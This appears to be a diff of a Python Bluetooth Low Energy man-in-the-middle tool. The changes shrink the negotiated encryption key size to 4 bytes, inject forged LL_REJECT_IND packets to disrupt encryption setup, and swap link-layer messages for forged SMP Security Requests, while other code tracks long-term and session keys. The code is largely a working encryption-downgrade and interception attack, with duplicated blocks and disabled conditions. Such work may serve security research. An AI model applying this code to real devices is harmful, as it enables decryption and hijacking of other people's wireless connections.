@@ -88,7 +88,7 @@ Empty--------->
 
 # global variable to access hardware
 hw = None
-new_key_size = 0x07
+new_key_size = 0x04
 
 found_key = None                  
 _found_key_lock = threading.Lock()
@@ -544,7 +544,6 @@ def _extract_smp_key_size_from_ll_body(ll_body: bytes):
     return (smp_code, smp[4])
 
 def _extract_smp_auth_from_ll_body(ll_body: bytes):
-    # very similar to _extract_smp_key_size_from_ll_body
     if len(ll_body) < 4:
         return None
     llid = ll_body[0] & 0x03
@@ -873,7 +872,7 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
 
 
         # Replace LL_ENC_RSP with LL_REJECT_IND if bonding is set
-        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04 and bonding and repair:
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04 and bonding and repair and False:
 
             print("[MODIFY] Replacing LL_ENC_RSP with LL_REJECT_IND (PIN or Key Missing)")
 
@@ -894,9 +893,44 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False, manager=None):
 
             print(f"  Final msg.body = {msg.body.hex()}")
             pairing_req_to_ll_reject_ind = True
+            if LLENCREQ_body_copy is not None and LLENCREQ_event_copy is not None:
+                # Extract and reuse NESN/SN/MD flags only
+                event = LLENCREQ_event_copy - 5
+                old_hdr = LLENCREQ_body_copy[0] if len(LLENCREQ_body_copy) > 0 else 0x00
+                llid_masked = (old_hdr & 0b11111100) | 0x03  # LLID = 0b11 = LL Control PDU
 
+                reject_opcode = 0x0D
+                error_code = 0x06
+                new_len = 2  # 1-byte opcode + 1-byte error
+
+                # Compose PDU cleanly from scratch
+                reject_pdu = bytes([llid_masked, new_len, reject_opcode, error_code])
+
+                # Optionally ensure no trailing garbage
+                reject_pdu = reject_pdu[:4]  # truncate to exact length if necessary
+
+                reject_pdu = bytes([reject_opcode, error_code])
+                # Transmit with fresh or compatible event if possible
+                hw.cmd_transmit(3, reject_pdu)  # safer to skip reusing old event
+                print(f"[INJECT] Sent LL_REJECT_IND (0x06) to peripheral: {reject_pdu.hex()}")
+            conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
+            smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x0D])  # L2CAP + SMP
+            new_len = len(smp_sec_req)
+            old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
+            #llid_masked = (old_hdr & 0b11111100) | 0x01 # LLID = 0b01 (L2CAP start)
+            llid_masked = (old_hdr & 0b11111100) | 0x02  # LLID = 0b10 = L2CAP Start
+
+            smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x0D])  # L2CAP + SMP
+            new_len = len(smp_sec_req)
+            old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
+            #llid_masked = (old_hdr & 0b11111100) | 0x01 # LLID = 0b01 (L2CAP start)
+            llid_masked = (old_hdr & 0b11111100) | 0x02  # LLID = 0b10 = L2CAP Start
+            #msg.body = bytes([llid_masked, new_len]) + smp_sec_req
+            msg.body = bytes([llid_masked, len(smp_sec_req)]) + smp_sec_req
+            conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
+            return
         # Replace LL_START_ENC with a Security Request, and send LL_REJECT_IND to peripheral
-        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05 and bonding and repair:
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x05 and bonding and repair and False:
             print("[MODIFY] Transforming LL_START_ENC_REQ → SMP Security Request and injecting LL_REJECT_IND toward P")
 
 
@@ -975,7 +1009,7 @@ def sock_recv_print_forward(conn, quiet,filter_changes=False):
     global new_key_size
     global link_encryption_active
     global ltk, ltk_found, session_key
-    global binding
+    global bonding
     global sent_reject
     global LLENCREQ_body_copy 
     global LLENCREQ_event_copy 
@@ -1069,11 +1103,16 @@ def sock_recv_print_forward(conn, quiet,filter_changes=False):
         pkt.aa = hw.decoder_state.cur_aa
         pkt.event = event
 
-
+    if changed:
+        reject_opcode = 0x0D
+        error_code = 0x06
+        reject_pdu = bytes([reject_opcode, error_code])
+        hw.cmd_transmit(3, reject_pdu)  # safer to skip reusing old event
     # Handle LL_ENC_REQ from real central (C->P_r)
     if isinstance(pkt, LlControlMessage) and pkt.opcode == 0x03:
         LLENCREQ_body_copy = pkt.body
         LLENCREQ_event_copy = pkt.event
+        #if not bonding:
         skdm, ivm = _extract_skd_iv_from_ll_enc_req(pkt)
 
         if ivm is not None:
@@ -1095,6 +1134,66 @@ def sock_recv_print_forward(conn, quiet,filter_changes=False):
             print(f"[SKD] Combined real C<->P SKD (SKDm||SKDs): {_hx(skd_real_cp)}")
             if ltk_found:
                 try_update_session_key()
+    
+        change_LLENCREQ = True
+        if change_LLENCREQ:
+            old_hdr = LLENCREQ_body_copy[0] if len(LLENCREQ_body_copy) > 0 else 0x00
+            llid_masked = (old_hdr & 0b11111100) | 0x03  # LLID = 0b11 = LL Control PDU
+
+            reject_opcode = 0x0D
+            error_code = 0x06
+            new_len = 2  # 1-byte opcode + 1-byte error
+
+            # Compose PDU cleanly from scratch
+            reject_pdu = bytes([llid_masked, new_len, reject_opcode, error_code])
+
+            # Optionally ensure no trailing garbage
+            reject_pdu = reject_pdu[:4]  # truncate to exact length if necessary
+
+            reject_pdu = bytes([reject_opcode, error_code])
+            # Transmit with fresh or compatible event if possible
+            hw.cmd_transmit(3, reject_pdu, LLENCREQ_event_copy)  # safer to skip reusing old event
+            print(f"Change LL ENC REQ to LL_REJECT_IND (0x06) to peripheral: {reject_pdu.hex()}")
+            bonding = False
+            return
+        
+        if bonding:
+            bonding = False
+            return
+
+        # # Extract and reuse NESN/SN/MD flags only
+
+
+        # reject_opcode = 0x0D
+        # error_code = 0x06
+        # new_len = 2  # 1-byte opcode + 1-byte error
+
+        # # # Compose PDU cleanly from scratch
+        # # reject_pdu = bytes([llid_masked, new_len, reject_opcode, error_code])
+
+        # # # Optionally ensure no trailing garbage
+        # # reject_pdu = reject_pdu[:4]  # truncate to exact length if necessary
+
+        # reject_pdu = bytes([reject_opcode, error_code])
+        # # Transmit with fresh or compatible event if possible
+        # hw.cmd_transmit(3, reject_pdu)  # safer to skip reusing old event
+        # print(f"[INJECT] Sent LL_REJECT_IND (0x06) to peripheral: {reject_pdu.hex()}")
+        # conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
+        # smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x0D])  # L2CAP + SMP
+        # new_len = len(smp_sec_req)
+        # old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
+        # #llid_masked = (old_hdr & 0b11111100) | 0x01 # LLID = 0b01 (L2CAP start)
+        # llid_masked = (old_hdr & 0b11111100) | 0x02  # LLID = 0b10 = L2CAP Start
+
+        # smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x0D])  # L2CAP + SMP
+        # new_len = len(smp_sec_req)
+        # old_hdr = msg.body[0] if len(msg.body) > 0 else 0x00
+        # #llid_masked = (old_hdr & 0b11111100) | 0x01 # LLID = 0b01 (L2CAP start)
+        # llid_masked = (old_hdr & 0b11111100) | 0x02  # LLID = 0b10 = L2CAP Start
+        # #msg.body = bytes([llid_masked, new_len]) + smp_sec_req
+        # msg.body = bytes([llid_masked, len(smp_sec_req)]) + smp_sec_req
+        # conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
+
 
     #Check for LL_PAUSE_ENC_RSP
     if isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0b:
